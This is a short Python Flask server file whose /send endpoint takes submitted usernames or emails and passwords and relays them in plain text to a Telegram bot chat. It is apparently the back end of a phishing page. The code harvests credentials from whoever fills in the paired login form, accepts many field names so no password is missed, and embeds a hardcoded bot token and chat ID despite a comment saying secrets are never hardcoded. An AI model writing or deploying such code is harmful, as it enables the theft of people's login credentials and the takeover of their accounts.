import os
import requests
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Use environment variables — never hardcode secrets
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8941028344:AAEYsRq2psDO5o5CCxYIM7Q_z9ryE9s6PZo")
CHAT_ID = os.environ.get("CHAT_ID", "1584744130")


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send", methods=["POST"])
def send():
    # Log the raw body first — this is how you'll see what actually arrives
    print("RAW BODY:", request.get_data(as_text=True))

    # Accept JSON or classic form-encoded submissions
    if request.is_json:
        data = request.get_json(silent=True) or {}
    else:
        data = request.form.to_dict()

    print("PARSED DATA:", data)

    # Tolerate different key names so the value never gets lost
    username = (
        data.get("username") or data.get("Username") or
        data.get("user") or data.get("email") or data.get("login") or "N/A"
    )
    password = (
        data.get("password") or data.get("Password") or
        data.get("pass") or data.get("pwd") or data.get("passwd") or "EMPTY"
    )

    message = f"New message\n\nUsername: {username}\nPassword: {password}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    response = requests.post(
        url,
        json={"chat_id": CHAT_ID, "text": message},
        timeout=10
    )

    print("TELEGRAM RESPONSE:", response.status_code, response.text)

    if response.status_code == 200:
        return jsonify({"success": True}), 200
    return jsonify({"success": False, "error": response.text}), 502


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)